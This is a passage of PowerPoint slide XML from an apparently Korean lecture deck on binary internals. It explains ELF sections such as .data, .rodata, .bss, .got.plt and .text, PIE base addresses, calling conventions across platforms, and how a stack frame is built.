              </a:rPr>
              <a:t> 값을 더해주면 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.data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 확인이 가능합니다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AD35E58-E19D-31EB-306D-DD546E6E9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1322427"/>
            <a:ext cx="6792127" cy="310179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204DC7F-DFA6-CD2F-B04F-85BCD8C80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92" y="4669685"/>
            <a:ext cx="5848350" cy="8477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AF4AA9E-0CE8-64CF-1E3B-CBB8F5BDD922}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195126" y="4632737"/>
            <a:ext cx="432261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.data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>영역 확인 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>변수 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>‘1’ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>값이 확인되고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const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>형태로 선언한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rodata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변수가 있는데 어떠한 주소가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적혀있습니다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237AE71-CC40-9DAA-1122-AF3001244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046" y="5762877"/>
            <a:ext cx="3429000" cy="8191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D1F81FE-778D-C059-A41A-25B417C0C610}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7195126" y="5886776"/>
            <a:ext cx="4322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해당 주소 확인 시 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rodata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섹션이며 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>“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rodata</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>” </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>문자열이 저장되어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6271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D00D-A021-4BBB-F858-C71D734F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451AFAE-B42D-A5B8-9A77-B93D51614F8E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F5FDA-2A69-B18B-5136-59DBC21FA954}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3538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section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2B39E-1ABE-29CD-CA02-9D28E597E8C9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4E72F-9B68-AECE-0F72-0FA7EDF97284}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1273233"/>
            <a:ext cx="9945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bss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섹션과 동적 컴파일 된 프로그램에서 외부 라이브러리 함수 호출 시 참조하는 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plt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, &amp;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got.plt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9F86B28-C0A3-65FC-75E7-464CC9B44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321" y="3862650"/>
            <a:ext cx="6591300" cy="8191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070B6D-E7F8-2C46-BA68-37A3C25B26F2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2479265" y="4711570"/>
            <a:ext cx="6591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 확인 시 소스코드 내 작성한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printf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함수의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가 적혀 있는 것을 확인할 수 있습니다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3199F4F-32C3-E9FA-91B6-1AA85D746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271" y="5299202"/>
            <a:ext cx="6610350" cy="485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F6F4BAA-0B04-0448-9487-6C75AC5BD664}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2479266" y="5849389"/>
            <a:ext cx="6424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printf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함수의 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got.plt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값이 존재하는 것을 확인할 수 있습니다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58392-3A81-70F4-4DF3-9F386C7CF092}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2999633" y="2968449"/>
            <a:ext cx="495443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마찬가지로 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bss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영역도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Pie_base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값에 섹션 값을 더해주어 확인해보면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선언만 되고 아직 초기화되지 않은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bss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변수를 확인할 수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95990AF-F21E-C059-31F4-88B063A6F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3821" y="1806324"/>
            <a:ext cx="5448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8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F3A37-0F07-890B-79ED-0FCA7115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AE83CAA-CECD-778A-8C5E-FF5A79BAAE3A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A28B5-1893-65EB-D18E-DE7F83693F23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="3538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section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DA832-36C9-E88D-8283-1D3B96D2FEB9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D63AED-D8A2-72A2-8A15-9A4D999920D5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1203444"/>
            <a:ext cx="994590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다음은 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.text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</a:t>
            </a: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해당 영역은 실제로 실행되어야 하는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코드 영역으로 실행권한이 주어지며 기계어가 작성되어 있습니다</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
            </a:endParaRP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FE9A36-34D5-AF7C-AD4C-5CC76789A0E3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="372963" y="5214421"/>
            <a:ext cx="43407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해당 영역에는 소스코드에 작성된 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>main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함수만 있는 것이 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아닌 여러 초기화 작업 등을 수행하는 함수가 존재합니다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0B9A19-7843-01AD-23C6-A3A28550D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1896757"/>
            <a:ext cx="8172450" cy="12763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C32848C-CE56-C72F-55E4-A5F8B105B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" y="3343979"/>
            <a:ext cx="4610667" cy="163684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80C548E-667C-7605-90B4-DBF2916AB5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173"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7593875" y="3343979"/>
            <a:ext cx="3884286" cy="9784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2076D73-C02A-4C1F-B4D5-C71A8C872A3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5291813" y="5851640"/>
            <a:ext cx="4340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_init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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> text</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 섹션의 기계어를 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(0x555555555000)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 명령어 포맷 확인 시 실제 실행되는 어셈블리어를 확인할 수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7CD0E6-5A63-AEA7-13D9-C6E67E1777D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5319882" y="3425395"/>
            <a:ext cx="2142309" cy="81560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init </a:t>
            </a:r>
          </a:p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4883ec08488b05c52f00004885c07402ffd04883c408c3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992A907-0D84-67BC-15A3-843D51A9F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882" y="4391848"/>
            <a:ext cx="3501434" cy="130894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7539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18EF4-E896-7C03-7B76-73B75485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2EB0B1-37AE-63E5-D669-520D44D0DE3B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3C93-6555-5620-2BE8-DA4FAC797B52}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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01E70-7342-D965-5F2E-DA027B03F7AA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71F83D-4A9C-B7F6-7AE4-A08F5FF90D8A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1157725"/>
            <a:ext cx="99459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spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>운영체제에 따라 프로그램 내에서 함수 실행 시 자신의 환경에 맞는 함수 호출 규약</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Calling Convention)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>이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/>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just"/>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>함수 호출 규약</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>(Calling Convention)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1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이란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프로그램 런타임 중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함수 호출 및 종료 과정</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>을 정의해 놓은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약속</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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3007BE6-5683-35D7-E4A0-C6BDB29F6A34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="749034" y="2000293"/>
            <a:ext cx="10693932" cy="4429665"/>
            <a:chOff x="867266" y="1827573"/>
            <a:chExt cx="10693932" cy="442966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D4B293C-A4A6-0C25-7D8D-CFCB66F4B454}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="875103" y="1833334"/>
              <a:ext cx="5292000" cy="21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스택을 사용하여 인자 전달</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>호출자가 스택 정리</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>담당</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
                <a:t>반환값</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>저장 위치</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t> = EAX</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>등등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9B67740-8ABD-D123-033A-DD048AF615E2}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6269198" y="1833334"/>
              <a:ext cx="5292000" cy="216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레지스터를 사용하여 인자 전달</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>피호출자가 스택 정리 담당</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
                <a:t>반환값</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t> 저장 위치 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t>= RAX</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>등등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FE4B949-D19A-CC0A-E4BF-1C107ED952EC}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="867266" y="4097238"/>
              <a:ext cx="5292000" cy="216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레지스터를 사용하여 인자 전달</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>호출자가 스택 정리</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ko-KR" dirty="0"/>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0" err="1"/>
                <a:t>반환값</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>저장 위치</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0"/>
                <a:t> = X0</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0"/>
                <a:t>등등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C94D839-A2B2-5592-396B-136097332DDE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6269198" y="4097238"/>
              <a:ext cx="5292000" cy="216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레지스터를 사용하여 인자 전달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호출자가 스택 정리 담당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반환값</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> 저장 위치 </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>= RAX</a:t>
              </a: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등등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844B5FA-66F6-14D9-EA2C-39FCDAF4B62B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="881030" y="1827573"/>
              <a:ext cx="22852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</a:rPr>
                <a:t>x86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linux</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> (32bit) : </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>cdecl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8E30E03-F4F5-9D85-1B5F-676210753FBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6188132" y="2033989"/>
            <a:ext cx="4140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x86-64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> (64bit) : system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>V AMD64 ABI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8F73F0-2A39-8AC9-AA62-1AD70F96E612}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="756870" y="4312908"/>
            <a:ext cx="3066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arm64 (Android &amp; iOS): AAPCS64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32700-F735-10C6-B871-BB4668EC7D27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6150965" y="4289540"/>
            <a:ext cx="53791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x86-64 Windows (64bit) : Microsoft x64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48316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CC3FB-8C39-EAD3-D639-B7BF9B96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C1822B-8B51-942E-6984-02F669BF54E4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34CF1-5B2B-C6CD-1540-A2CF188FE17F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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3DB7AC-56AA-3AD4-4300-C7713E3A12F4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973CC-0876-740C-2C87-8692B7375A83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1214987"/>
            <a:ext cx="9945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프로그램 내에서 함수 호출 시 항상 새로운 스택 프레임을 형성하여 그 안에서 지역변수나 값 저장 등을 수행합니다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3C1D50-05C4-8B26-35D0-30C3D858E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71" y="1731146"/>
            <a:ext cx="3777325" cy="48827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654308-FDE7-F5A0-06BE-9765F9FC8BA5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781856" y="2858834"/>
            <a:ext cx="5960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1. call func2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>수행 시</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> [call func2] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령의 다음 명령 주소 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push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DB2038-C452-5D2B-8BA4-0145CCED190B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781856" y="3425515"/>
            <a:ext cx="5960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2. call func1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 프레임 포인터 주소 값 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>push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6E202E-4967-3293-170D-707BDF029377}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781856" y="3992196"/>
            <a:ext cx="5960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3. mov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rbp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rsp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명령으로 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>의 프레임 포인터 생성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EF9154-69A4-2B0F-7C81-B1EBB5A7B1B9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4781856" y="4558877"/>
            <a:ext cx="5960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4. sub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rsp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>사용할 크기</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령으로 함수에서 사용할 스택 영역 확보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84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F94FE-835E-5329-B6BE-46885F93D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2727C8-9BB5-C7C5-DE93-3E4DA46F8E09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2DEB8-4B7C-28C4-235F-4B86A94417C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="5991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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial Nova Light" panose="020B0304020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Calling Convention</a:t>
            </a:r>
            <a:endParaRPr lang="ko-KR" altLang="en-US" sz="36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3E7E8F-2D8E-907F-B9FA-07BD91C27E81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7BB74-BC6E-795B-2B8E-344C4A6B2AE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1214987"/>
            <a:ext cx="994590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x86_64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서의 </a:t>
            </a:r>
            <a:r>
